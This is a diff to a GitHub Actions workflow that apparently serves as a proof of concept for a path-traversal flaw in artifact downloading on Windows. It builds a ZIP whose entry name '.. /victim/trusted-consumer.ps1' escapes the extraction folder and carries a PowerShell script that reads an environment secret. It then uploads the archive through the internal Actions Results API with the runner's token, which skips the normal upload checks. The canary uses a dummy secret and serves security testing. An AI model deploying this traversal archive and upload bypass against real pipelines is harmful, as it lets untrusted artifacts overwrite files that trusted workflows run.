@@ -13,16 +13,16 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 8
     steps:
-      - name: Build harmless normalization canary artifact
+      - name: Build exact harmless normalization canary ZIP
         shell: bash
         run: |
           set -euo pipefail
           umask 077
-          root='ghbb-artifact-root'
-          crafted="$root/.. /victim"
-          mkdir -p "$crafted"
-          cat > "$crafted/trusted-consumer.ps1" <<'POWERSHELL'
-          $ErrorActionPreference = 'Stop'
+          python - <<'PY'
+          import os
+          import zipfile
+
+          payload = r'''$ErrorActionPreference = 'Stop'
           $marker = 'GHBB-DOWNLOAD-ARTIFACT-WINDOWS-NORMALIZATION-20260726'
           $secret = [Environment]::GetEnvironmentVariable('GHBB_DUMMY_SECRET')
           $sha = [System.BitConverter]::ToString(
@@ -35,15 +35,96 @@ jobs:
             "dummy_secret_sha256=$sha"
             'source=untrusted-artifact'
           ) | Set-Content -Path (Join-Path $env:RUNNER_TEMP 'ghbb-download-artifact-proof.txt') -Encoding utf8
-          POWERSHELL
-          printf 'producer_run=%s\n' "$GITHUB_RUN_ID" > "$root/producer-context.txt"
-          printf 'Created artifact entries:\n'
-          find "$root" -printf '%P\n' | sed -n '1,20p'
+          '''
 
-      - name: Upload harmless normalization canary
-        uses: actions/upload-artifact@v7
+          with zipfile.ZipFile('ghbb-win-normalization.zip', 'w', zipfile.ZIP_DEFLATED) as archive:
+              archive.writestr('.. /victim/trusted-consumer.ps1', payload)
+              archive.writestr('producer-context.txt', f'producer_run={os.environ["GITHUB_RUN_ID"]}\n')
+
+          with zipfile.ZipFile('ghbb-win-normalization.zip') as archive:
+              for name in archive.namelist():
+                  print(repr(name))
+          PY
+          sha256sum ghbb-win-normalization.zip
+
+      - name: Publish exact ZIP through the Actions Results artifact protocol
+        uses: actions/github-script@v7
         with:
-          name: ghbb-win-normalization-${{ github.run_id }}
-          path: ghbb-artifact-root/
-          retention-days: 1
-          if-no-files-found: error
+          script: |
+            const fs = require('fs')
+            const crypto = require('crypto')
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            if (!token || !resultsUrl) throw new Error('Actions Results runtime context unavailable')
+
+            const parts = token.split('.')
+            if (parts.length < 3) throw new Error('Actions runtime token is not a JWT')
+            const payload = parts[1] + '='.repeat((4 - parts[1].length % 4) % 4)
+            const claims = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'))
+            const match = /(?:^| )Actions\.Results:([^: ]+):([^ ]+)/.exec(claims.scp || '')
+            if (!match) throw new Error('Actions.Results scope unavailable')
+            const runBackendId = match[1]
+            const jobBackendId = match[2]
+
+            const zip = fs.readFileSync('ghbb-win-normalization.zip')
+            const digest = crypto.createHash('sha256').update(zip).digest('hex')
+            const artifactName = `ghbb-win-normalization-${context.runId}`
+            const base = resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`
+            const service = `${base}twirp/github.actions.results.api.v1.ArtifactService`
+
+            async function twirp(method, body) {
+              const response = await fetch(`${service}/${method}`, {
+                method: 'POST',
+                headers: {
+                  authorization: `Bearer ${token}`,
+                  'content-type': 'application/json'
+                },
+                body: JSON.stringify(body),
+                signal: AbortSignal.timeout(20000)
+              })
+              const text = await response.text()
+              let json = null
+              try { json = text ? JSON.parse(text) : {} } catch (_) {}
+              return {status: response.status, json}
+            }
+
+            const created = await twirp('CreateArtifact', {
+              workflow_run_backend_id: runBackendId,
+              workflow_job_run_backend_id: jobBackendId,
+              name: artifactName,
+              version: 7,
+              mime_type: 'application/zip'
+            })
+            const uploadUrl = created.json?.signed_upload_url || created.json?.signedUploadUrl || ''
+            if (!uploadUrl) throw new Error(`CreateArtifact did not return an upload URL (HTTP ${created.status})`)
+            core.setSecret(uploadUrl)
+
+            const uploaded = await fetch(uploadUrl, {
+              method: 'PUT',
+              headers: {
+                'x-ms-blob-type': 'BlockBlob',
+                'x-ms-version': '2021-12-02',
+                'content-type': 'application/zip'
+              },
+              body: zip,
+              signal: AbortSignal.timeout(20000)
+            })
+
+            const finalized = await twirp('FinalizeArtifact', {
+              workflow_run_backend_id: runBackendId,
+              workflow_job_run_backend_id: jobBackendId,
+              name: artifactName,
+              size: String(zip.length),
+              hash: `sha256:${digest}`
+            })
+
+            const valid = created.status === 200 &&
+              uploaded.status >= 200 && uploaded.status < 300 &&
+              finalized.status === 200 && finalized.json?.ok === true
+            console.log(`artifact_name=${artifactName}`)
+            console.log(`create_http=${created.status}`)
+            console.log(`upload_http=${uploaded.status}`)
+            console.log(`finalize_http=${finalized.status}`)
+            console.log(`finalize_ok=${finalized.json?.ok === true}`)
+            console.log(`zip_sha256=${digest}`)
+            if (!valid) throw new Error('Controlled artifact publication failed')
